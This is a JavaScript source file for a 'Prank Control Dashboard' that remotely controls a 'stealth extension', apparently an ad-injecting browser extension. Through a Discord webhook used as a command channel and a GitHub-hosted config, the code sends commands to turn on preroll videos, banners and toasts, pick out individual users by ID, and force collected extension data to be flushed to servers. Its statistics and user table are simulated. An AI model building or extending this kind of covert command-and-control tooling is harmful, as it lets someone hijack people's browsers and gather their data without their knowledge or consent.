// Prank Control Dashboard JavaScript
// Real-time web interface for controlling the stealth extension

class PrankDashboard {
    constructor() {
        this.config = {
            githubConfigUrl: 'https://raw.githubusercontent.com/NachoPayback/6301912-SP-Ad-Pumper/master/config.json',
            discordWebhook: 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN',
            dataEndpoint: 'https://script.google.com/macros/s/YOUR_GOOGLE_SCRIPT_ID/exec'
        };
        
        this.currentConfig = {};
        this.activeUsers = new Map();
        this.targetedUser = null;
        
        this.init();
    }

    async init() {
        console.log('🎯 Initializing Prank Dashboard...');
        
        this.setupEventListeners();
        await this.loadCurrentConfig();
        this.startRealTimeUpdates();
        this.updateUI();
        
        console.log('✅ Dashboard ready!');
    }

    setupEventListeners() {
        // Toggle controls
        document.getElementById('masterToggle').addEventListener('click', () => this.toggleFeature('enabled'));
        document.getElementById('prerollToggle').addEventListener('click', () => this.toggleFeature('preroll'));
        document.getElementById('bannerToggle').addEventListener('click', () => this.toggleFeature('banners'));
        document.getElementById('toastToggle').addEventListener('click', () => this.toggleFeature('toast'));

        // Frequency slider
        const slider = document.getElementById('frequencySlider');
        const valueDisplay = document.getElementById('frequencyValue');
        slider.addEventListener('input', (e) => {
            const value = e.target.value;
            valueDisplay.textContent = value + '%';
            this.updateFrequency(value);
        });

        // Action buttons
        document.getElementById('emergencyStop').addEventListener('click', () => this.emergencyStop());
        document.getElementById('enableAllBtn').addEventListener('click', () => this.enableAll());
        document.getElementById('disableAllBtn').addEventListener('click', () => this.disableAll());
        document.getElementById('changeVideoBtn').addEventListener('click', () => this.changeVideo());
        document.getElementById('targetUserBtn').addEventListener('click', () => this.targetUser());
        document.getElementById('flushDataBtn').addEventListener('click', () => this.flushData());

        // User table clicks
        document.getElementById('usersTable').addEventListener('click', (e) => {
            const row = e.target.closest('.user-row');
            if (row) {
                const userId = row.dataset.userid;
                this.targetUserById(userId);
            }
        });
    }

    async loadCurrentConfig() {
        try {
            const response = await fetch(this.config.githubConfigUrl + '?t=' + Date.now());
            this.currentConfig = await response.json();
            console.log('📥 Config loaded:', this.currentConfig);
        } catch (error) {
            console.error('Failed to load config:', error);
            this.showAlert('danger', 'Failed to load current configuration');
        }
    }

    async updateGitHubConfig(updates) {
        // In real implementation, this would use GitHub API to update config.json
        // For now, we'll just send commands via Discord webhook
        
        const updatedConfig = { ...this.currentConfig, ...updates };
        
        try {
            // Send update command via Discord
            await fetch(this.config.discordWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔄 **Config Update from Dashboard**`,
                    embeds: [{
                        title: "Configuration Changes",
                        color: 3447003,
                        fields: [
                            { name: "Updates", value: JSON.stringify(updates, null, 2), inline: false },
                            { name: "Source", value: "Web Dashboard", inline: true },
                            { name: "Timestamp", value: new Date().toISOString(), inline: true }
                        ]
                    }]
                })
            });
            
            this.currentConfig = updatedConfig;
            this.showAlert('success', 'Configuration updated successfully!');
            
        } catch (error) {
            console.error('Failed to update config:', error);
            this.showAlert('danger', 'Failed to update configuration');
        }
    }

    async sendCommand(command, args = {}) {
        try {
            await fetch(this.config.discordWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `⚡ **Dashboard Command**: ${command}`,
                    embeds: [{
                        title: "Real-time Command Execution",
                        color: 15158332,
                        fields: [
                            { name: "Command", value: command, inline: true },
                            { name: "Arguments", value: JSON.stringify(args, null, 2), inline: true },
                            { name: "Source", value: "Web Dashboard", inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            });
            
            this.showAlert('success', `Command "${command}" sent successfully!`);
            
        } catch (error) {
            console.error('Failed to send command:', error);
            this.showAlert('danger', `Failed to send command: ${command}`);
        }
    }

    // UI Control Methods
    async toggleFeature(feature) {
        const toggleElement = document.getElementById(feature + 'Toggle') || document.getElementById('masterToggle');
        const isActive = toggleElement.classList.contains('active');
        
        if (isActive) {
            toggleElement.classList.remove('active');
        } else {
            toggleElement.classList.add('active');
        }
        
        let configUpdate = {};
        
        if (feature === 'enabled') {
            configUpdate.enabled = !isActive;
        } else {
            configUpdate.features = { ...this.currentConfig.features };
            configUpdate.features[feature] = !isActive;
        }
        
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand(`TOGGLE_${feature.toUpperCase()}`, { enabled: !isActive });
    }

    async updateFrequency(value) {
        const configUpdate = { display_frequency: parseInt(value) };
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand('SET_FREQUENCY', { frequency: value });
    }

    async emergencyStop() {
        if (confirm('Are you sure you want to EMERGENCY STOP all extensions?')) {
            await this.sendCommand('EMERGENCY_STOP');
            
            // Update all toggles to off
            document.querySelectorAll('.toggle').forEach(toggle => {
                toggle.classList.remove('active');
            });
            
            this.showAlert('danger', '🚨 EMERGENCY STOP ACTIVATED - All extensions disabled');
        }
    }

    async enableAll() {
        document.querySelectorAll('.toggle').forEach(toggle => {
            toggle.classList.add('active');
        });
        
        const configUpdate = {
            enabled: true,
            features: { preroll: true, banners: true, toast: true }
        };
        
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand('ENABLE_ALL');
    }

    async disableAll() {
        document.querySelectorAll('.toggle').forEach(toggle => {
            toggle.classList.remove('active');
        });
        
        const configUpdate = {
            enabled: false,
            features: { preroll: false, banners: false, toast: false }
        };
        
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand('DISABLE_ALL');
    }

    async changeVideo() {
        const videoSelect = document.getElementById('videoSelect');
        const videoId = videoSelect.value;
        const videoText = videoSelect.options[videoSelect.selectedIndex].text;
        
        const configUpdate = {
            preroll: { ...this.currentConfig.preroll, videoId: videoId }
        };
        
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand('CHANGE_VIDEO', { videoId, videoText });
    }

    async targetUser() {
        const userIdInput = document.getElementById('targetUserId');
        const userId = userIdInput.value.trim();
        
        if (userId) {
            await this.targetUserById(userId);
            userIdInput.value = '';
        }
    }

    async targetUserById(userId) {
        // Remove previous targeting
        document.querySelectorAll('.user-row').forEach(row => {
            row.classList.remove('targeted');
        });
        
        // Add targeting to selected user
        const userRow = document.querySelector(`[data-userid="${userId}"]`);
        if (userRow) {
            userRow.classList.add('targeted');
        }
        
        this.targetedUser = userId;
        
        const configUpdate = {
            realtime_control: { 
                ...this.currentConfig.realtime_control, 
                target_user: userId 
            }
        };
        
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand('TARGET_USER', { userId });
        
        this.showAlert('warning', `🎯 User ${userId} is now TARGETED`);
    }

    async flushData() {
        await this.sendCommand('FORCE_FLUSH_DATA');
        this.showAlert('success', '💾 All extension data flushed to servers');
    }

    // Real-time data updates
    startRealTimeUpdates() {
        // Update stats every 30 seconds
        setInterval(() => {
            this.updateStats();
            this.updateActiveUsers();
        }, 30000);
        
        // Initial update
        this.updateStats();
        this.updateActiveUsers();
    }

    async updateStats() {
        try {
            // In real implementation, this would fetch from your data endpoint
            // For demo, we'll simulate data
            const stats = {
                activeUsers: Math.floor(Math.random() * 50) + 100,
                totalImpressions: Math.floor(Math.random() * 1000) + 2000,
                clickThrough: (Math.random() * 20 + 5).toFixed(1),
                dataPoints: Math.floor(Math.random() * 5000) + 10000
            };
            
            document.getElementById('activeUsers').textContent = stats.activeUsers;
            document.getElementById('totalImpressions').textContent = stats.totalImpressions.toLocaleString();
            document.getElementById('clickThrough').textContent = stats.clickThrough + '%';
            document.getElementById('dataPoints').textContent = stats.dataPoints.toLocaleString();
            
        } catch (error) {
            console.error('Failed to update stats:', error);
        }
    }

    async updateActiveUsers() {
        // In real implementation, fetch from your data endpoint
        // For demo, we'll update the "last seen" times
        document.querySelectorAll('.user-row').forEach((row, index) => {
            const lastSeenCell = row.cells[2];
            const minutes = Math.floor(Math.random() * 20) + 1;
            lastSeenCell.textContent = `${minutes} minutes ago`;
        });
    }

    updateUI() {
        // Update toggles based on current config
        if (this.currentConfig.enabled) {
            document.getElementById('masterToggle').classList.add('active');
        }
        
        if (this.currentConfig.features) {
            if (this.currentConfig.features.preroll) {
                document.getElementById('prerollToggle').classList.add('active');
            }
            if (this.currentConfig.features.banners) {
                document.getElementById('bannerToggle').classList.add('active');
            }
            if (this.currentConfig.features.toast) {
                document.getElementById('toastToggle').classList.add('active');
            }
        }
        
        // Update frequency slider
        if (this.currentConfig.display_frequency) {
            const slider = document.getElementById('frequencySlider');
            const valueDisplay = document.getElementById('frequencyValue');
            slider.value = this.currentConfig.display_frequency;
            valueDisplay.textContent = this.currentConfig.display_frequency + '%';
        }
    }

    showAlert(type, message) {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type}`;
        alertDiv.textContent = message;
        
        const activityLog = document.getElementById('activityLog');
        activityLog.insertBefore(alertDiv, activityLog.firstChild);
        
        // Remove old alerts (keep only last 10)
        const alerts = activityLog.querySelectorAll('.alert');
        if (alerts.length > 10) {
            alerts[alerts.length - 1].remove();
        }
        
        // Auto-remove success/warning alerts after 5 seconds
        if (type === 'success' || type === 'warning') {
            setTimeout(() => {
                if (alertDiv.parentNode) {
                    alertDiv.remove();
                }
            }, 5000);
        }
    }
}

// Initialize dashboard when page loads
document.addEventListener('DOMContentLoaded', () => {
    window.prankDashboard = new PrankDashboard();
});

// Simulate connection status
setInterval(() => {
    const indicator = document.getElementById('connectionStatus');
    // Occasionally flicker to yellow to show activity
    if (Math.random() < 0.1) {
        indicator.style.background = '#f39c12';
        setTimeout(() => {
            indicator.style.background = '#27ae60';
        }, 1000);
    }
}, 5000); 